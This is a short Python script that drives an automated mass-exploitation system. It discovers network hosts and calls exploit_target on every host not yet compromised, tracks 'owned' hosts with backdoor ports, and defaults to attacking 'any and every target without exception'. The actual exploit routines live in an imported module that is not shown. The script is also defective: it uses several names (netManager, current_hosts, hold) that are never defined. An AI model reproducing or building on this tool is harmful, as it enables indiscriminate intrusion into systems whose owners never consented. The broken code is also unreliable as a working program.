#!/usr/local/python3

import main
import json, sys

# ALL will attack any and every target without exception
# BLACKLIST will blacklist a host, set of hosts or subnet
# WHITELIST will only attack a host, set of hosts or subnet
TARGET_RANGE = 'ALL'

controller = main.HostController()

#list of public ips
networks = []
#data format should be a tuple with (local_address:backdoor_port,public_address)
hosts = []

print('[+] Run Exploitation system?(y/n)'),
if input() == 'y':
	print('[+] Execution started. Press ^C to kill.')
	while True:
		if TARGET_RANGE == 'ALL':
			hosts = netManager.find_hosts()
		elif 'BLACKLIST' in TARGET_RANGE:
			hosts = netManager.find_hosts(TARGET_RANGE.split()[1:],blacklist=True)
		elif 'WHITELIST' in TARGET_RANGE:
			hosts = netManager.find_hosts(TARGET_RANGE.split()[1:])
		if current_hosts == controller.post_exp.get_owned_hosts():
			print('[+] All exploitable systems have been compromised.')
			print('[+] Move listener into background?(y/n)')
			if input() == 'y':
				hold()
			else:
				sys.exit(0)
		visible_hosts = len(hosts)
		current_hosts = controller.post_exp.get_owned_hosts()

		try: 
			for host in hosts:
				if host not in current_hosts:
					controller.exploit_target(host)
				
		except KeyboardInterrupt as e:
			print('[-] KeyboardInterrupt: Execution stopped.')
			sys.exit(1)
else:
	print('[-] Execution cancelled.')
